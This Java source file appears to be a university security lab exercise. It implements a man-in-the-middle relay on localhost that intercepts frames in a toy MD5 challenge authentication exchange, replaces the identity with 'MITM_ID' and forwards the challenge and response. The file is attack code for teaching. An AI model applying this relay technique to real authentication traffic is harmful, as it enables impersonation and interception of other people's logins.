package com.polytech.security;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.UnknownHostException;

public class ManInTheMiddle {

	// create a request identity
	// create a fake identity response
	// create a fake request MD5 challenge
	// create a fake MD5 challenge response
	// create a fake success frame

	private static final int MAN_IN_THE_MIDDLE_PORT = 1079;
	private static final String DEFAULT_AUTHENTICATION_SERVER_HOST = "localhost";
	private static final int DEFAULT_AUTHENTICATION_SERVER_PORT = 1080;

	/*
	 * Starts the man in the middle: open a server socket and launch a thread that
	 * will handle the requests when a connexion is received.
	 */
	public static void main(String args[]) {
		ServerSocket ss;
		try {
			ss = new ServerSocket(MAN_IN_THE_MIDDLE_PORT);
		} catch (IOException iox) {
			log("I/O error at server socket creation");
			iox.printStackTrace();
			return;
		}
		while (true) {
			Socket s = null;
			try {
				s = ss.accept();
				log("connection from" + s.getInetAddress());
				SupplicantHandler handler =
					new SupplicantHandler(
						s,
						DEFAULT_AUTHENTICATION_SERVER_HOST,
						DEFAULT_AUTHENTICATION_SERVER_PORT);
				new Thread(handler).start();
			} catch (IOException iox) {
				iox.printStackTrace();
			}
		}
	}

	/*
	 * A SupplicantHandler object is created for each connection to this authenticationServer by a Supplicant.
	 * It reads Frame objects from that supplicant and handles them appropriately.
	 */
	private static class SupplicantHandler implements Runnable {

		private ObjectOutputStream toSupplicant;
		private ObjectInputStream fromSupplicant;
		private ObjectOutputStream toAuthenticationServer;
		private ObjectInputStream fromAuthenticationServer;

		private SupplicantHandler(
			Socket supplicantSocket,
			String authenticationServerHost,
			int authenticationServerPort)
			throws IOException {
			fromSupplicant =
				new ObjectInputStream(supplicantSocket.getInputStream());
			toSupplicant =
				new ObjectOutputStream(supplicantSocket.getOutputStream());
			try {
				Socket authenticationServerSocket =
					new Socket(authenticationServerHost, authenticationServerPort);
				toAuthenticationServer =
					new ObjectOutputStream(
						authenticationServerSocket.getOutputStream());
				fromAuthenticationServer =
					new ObjectInputStream(authenticationServerSocket.getInputStream());
			} catch (UnknownHostException uhx) {
				uhx.printStackTrace();
			} catch (IOException iox) {
				iox.printStackTrace();
			}

		}

		/*
		 * loops indefinitely reading objects from the socket
		 * and forwarding them to the handleFrame method
		 */
		public void run() {
			// TODO: implement the man in the middle logic
            Frame frame = readFrameFromauthenticationServer();
            //frame = readFrameFromauthenticationServer();
            log("received from authenticationServer: " + frame);
            frame.data.data="MITM_ID".getBytes();

            sendFrameToSupplicant(frame);
            log("sent to supplicant: " + frame);

			frame = readFrameFromSupplicant();
			log("received from supplicant: " + frame);

            frame.data.data="MITM_ID".getBytes();
            sendFrameToauthenticationServer(frame);
            log("sent to authenticationServer: " + frame);

            frame=readFrameFromauthenticationServer();
            log("received from authenticationServer: " + frame);
            sendFrameToSupplicant(frame);
            log("sent to supplicant: " + frame);

            frame=readFrameFromSupplicant();
            log("received from supplicant: " + frame);
            sendFrameToauthenticationServer(frame);
            log("sent to authenticationServer: " + frame);

            frame=readFrameFromauthenticationServer();
            log("received from authenticationServer: " + frame);
            sendFrameToSupplicant(frame);
            log("sent to supplicant: " + frame);

			/** modify it
			frame.code++;
			// forward it to the authenticationServer
			sendFrameToauthenticationServer(frame);
			log("sent to authenticationServer: " + frame);
			// read answer from authenticationServer
			frame = readFrameFromauthenticationServer();
			log("received from authenticationServer: " + frame);
			// modify the answer
			frame.length++;
			// send it back to supplicant
			sendFrameToSupplicant(frame);
			log("sent to supplicant: " + frame);  */
		}

		/*
		 * reads a frame from the supplicant socket
		 */
		private Frame readFrameFromSupplicant() {
			try {
				Object o = fromSupplicant.readObject();
				return (Frame) o;
			} catch (IOException iox) {
				iox.printStackTrace();
			} catch (ClassNotFoundException cnfx) {
				cnfx.printStackTrace();
			}
			return null;
		}

		/*
		 * reads a frame from the authenticationServer socket
		 */
		private Frame readFrameFromauthenticationServer() {
			try {
				Object o = fromAuthenticationServer.readObject();
				return (Frame) o;
			} catch (IOException iox) {
				iox.printStackTrace();
			} catch (ClassNotFoundException cnfx) {
				cnfx.printStackTrace();
			}
			return null;
		}

		/*
		 * Sends a frame through the authenticationServer socket
		 */
		private void sendFrameToauthenticationServer(Frame frame) {
			try {
				toAuthenticationServer.reset();
				toAuthenticationServer.writeObject(frame);
				toAuthenticationServer.flush();
			} catch (IOException iox) {
				iox.printStackTrace();
			}
		}

		/*
		 * Sends a frame through the supplicant socket
		 */
		private void sendFrameToSupplicant(Frame frame) {
			try {
				toSupplicant.reset();
				toSupplicant.writeObject(frame);
				toSupplicant.flush();
			} catch (IOException iox) {
				iox.printStackTrace();
			}
		}
	}
	
	static void log(String s) {
		System.out.println(s);
	}
}